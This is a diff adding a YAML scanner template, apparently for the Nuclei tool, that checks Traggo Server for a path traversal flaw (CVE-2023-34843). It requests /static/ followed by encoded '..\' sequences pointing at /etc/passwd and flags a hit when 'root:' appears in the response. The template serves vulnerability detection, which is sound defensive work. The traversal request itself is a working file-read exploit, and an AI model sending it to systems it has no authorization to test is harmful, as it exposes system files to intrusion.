@@ -1,0 +1,25 @@
+id: poc-yaml-traggo-static-path-traversal
+info:
+  name: Traggo Server Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-34843,arbitrary-file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
